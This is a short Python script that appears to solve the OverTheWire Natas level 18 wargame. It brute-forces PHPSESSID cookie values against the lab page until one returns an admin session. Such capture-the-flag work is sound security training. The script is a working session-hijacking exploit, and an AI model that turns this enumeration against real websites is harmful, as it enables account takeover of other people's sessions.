#!/usr/bin/env python

import requests

URL = 'http://natas18.natas.labs.overthewire.org/index.php'
USERNAME = 'natas18'
PASSWORD = 'xxxxxxxxxxxxxxxxxxxxxxxx'

ADDON = "?debug=true&username=admin&password=admin"
for i in range(640, -1, -1):
    cookies = {"PHPSESSID": str(i)}
    if i % 10 == 0:
        print("Trying %s" % cookies)


    r = requests.get(URL+ADDON, cookies=cookies, auth=(USERNAME, PASSWORD))
    if "You are an admin" in r.text:
        print("Found %s" % cookies)
        print(r.text)
        break
